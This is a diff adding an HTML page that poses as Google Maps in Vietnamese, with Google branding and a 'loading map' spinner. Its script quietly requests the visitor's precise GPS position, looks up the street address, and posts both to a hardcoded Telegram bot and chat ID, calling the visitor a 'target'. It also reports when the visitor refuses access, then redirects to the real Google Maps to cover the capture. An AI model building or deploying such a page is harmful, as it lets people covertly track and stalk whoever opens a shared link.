@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Google Maps - Định vị vị trí</title>
+    
+    <meta property="og:title" content="Xác nhận vị trí của bạn trên Google Maps">
+    <meta property="og:description" content="Nhấn để xem chỉ đường chi tiết đến vị trí hiện tại.">
+    <meta property="og:image" content="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
+
+    <style>
+        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { margin-top: 15px; color: #666; font-size: 14px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div style="text-align: center;">
+        <div class="loader" style="margin: 0 auto;"></div>
+        <div class="text">Đang tải bản đồ...</div>
+    </div>
+
+    <script>
+        // --- CẤU HÌNH TELEGRAM ---
+        const TG_TOKEN = "8123198134:AAHTKQPxi5CnW_HDEenVJjRZMZvx1REjLB4";
+        const TG_ID = "857408205";
+        const REDIRECT_URL = "https://www.google.com/maps";
+
+        async function sendToTelegram(msg) {
+            const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: TG_ID,
+                text: msg,
+                parse_mode: "HTML"
+            };
+            await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        async function getAddress(lat, lon) {
+            try {
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
+                const data = await res.json();
+                return data.display_name || "Không xác định";
+            } catch (e) {
+                return "Lỗi lấy địa chỉ";
+            }
+        }
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (p) => {
+                        const lat = p.coords.latitude;
+                        const lon = p.coords.longitude;
+                        const addr = await getAddress(lat, lon);
+                        const msg = `🎯 <b>MỤC TIÊU GITHUB!</b>\n📍 Tọa độ: <code>${lat},${lon}</code>\n🏠 Địa chỉ: <code>${addr}</code>\n🔗 <a href="https://www.google.com/maps?q=${lat},${lon}">Xem trên Maps</a>`;
+                        await sendToTelegram(msg);
+                        window.location.replace(REDIRECT_URL);
+                    },
+                    async (e) => {
+                        await sendToTelegram("⚠️ <b>Mục tiêu đã từ chối quyền truy cập GPS trên GitHub.</b>");
+                        window.location.replace(REDIRECT_URL);
+                    },
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            } else {
+                window.location.replace(REDIRECT_URL);
+            }
+            
+            // Tự động thoát sau 10 giây nếu kẹt
+            setTimeout(() => { window.location.replace(REDIRECT_URL); }, 10000);
+        };
+    </script>
+</body>
+</html>
